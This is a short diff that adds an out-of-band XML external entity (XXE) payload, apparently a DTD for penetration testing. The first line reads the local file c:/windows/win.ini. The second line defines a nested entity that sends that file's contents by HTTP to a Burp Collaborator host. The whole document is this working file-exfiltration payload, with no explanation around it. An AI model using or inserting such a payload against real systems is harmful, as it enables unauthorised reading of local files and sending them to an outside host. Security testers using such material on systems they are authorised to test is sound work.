@@ -1,0 +1,4 @@
+<!ENTITY % payl SYSTEM "file:///c:/windows/win.ini">
+
+<!ENTITY % param1 "<!ENTITY % exfil SYSTEM 'http://9lvfhs6lynj163t6l243jlxjtaz3ns.burpcollaborator.net/%payl;'>">
+
